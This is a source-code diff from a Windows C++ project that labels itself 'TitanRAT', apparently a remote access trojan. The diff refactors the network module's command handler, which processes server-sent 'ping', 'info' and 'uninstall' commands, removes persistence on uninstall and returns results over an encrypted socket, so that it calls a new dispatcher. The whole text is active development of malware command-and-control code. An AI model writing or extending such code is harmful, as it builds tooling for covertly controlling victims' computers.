@@ -1,6 +1,7 @@
 // Core/network.cpp
 #include "network.h"
 #include "persistence.h"
+#include "commands.h"
 #include <windows.h>
 #include <stdio.h>
 
@@ -131,22 +132,11 @@ void register_with_server(SOCKET sock, const std::string& hostname, std::string&
 }
 
 void process_command(const std::string& cmd, SOCKET sock) {
-    std::string result;
-    if (cmd == "ping") {
-        result = "pong";
-    } else if (cmd == "info") {
-        OSVERSIONINFOA vi = {sizeof(vi)};
-        GetVersionExA(&vi);
-        char os_buf[128];
-        sprintf_s(os_buf, "WinHost;Windows %d.%d Build %d", vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
-        result = os_buf;
-    } else if (cmd == "uninstall") {
-        uninstall_persistence();
-        OutputDebugStringA("[TitanRAT] Uninstalling and exiting...\n");
-        exit(0);
-    } else {
-        result = "NOT_IMPLEMENTED";
-    }
+    // Delegate to the new dispatcher
+    std::string result = execute_builtin_command(cmd, sock);
+    
+    // If we are here, the process hasn't exited (i.e., not 'uninstall')
+    // Send the result back
     send_encrypted(sock, result + "\n");
 }
 
